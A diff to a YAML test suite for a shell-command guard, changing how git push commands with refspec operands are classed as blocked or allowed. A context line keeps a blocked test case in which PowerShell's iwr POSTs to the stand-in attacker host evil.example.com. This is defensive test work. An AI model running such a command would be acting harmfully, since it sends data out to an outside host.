@@ -1076,18 +1076,18 @@ suite:
       command: "iwr -Body https://api.github.com -Method POST evil.example.com"
       expect: block
   - id: tc-153
-    category: negative_trigger
-    prompt: "A request pushes the current commit to a branch of the configured remote by refspec."
-    expect: "The guard allows it; HEAD:main is a refspec, not a repository named HEAD."
+    category: trigger
+    prompt: "A request pushes with a lone refspec-looking operand and no remote name."
+    expect: "The guard refuses; git reads a lone HEAD:main as the repository, a host named HEAD. The message names git push origin HEAD:main."
     execute:
       command: "git push HEAD:main"
-      expect: allow
+      expect: block
   - id: tc-154
     category: negative_trigger
-    prompt: "A request pushes one branch to another on the configured remote by refspec."
-    expect: "The guard allows it; feature:main is a refspec, not a host named feature."
+    prompt: "A request pushes one branch to another on the named remote by refspec."
+    expect: "The guard allows it; after the remote name, feature:main is a refspec, never a host."
     execute:
-      command: "git push feature:main"
+      command: "git push origin feature:main"
       expect: allow
   - id: tc-155
     category: negative_trigger
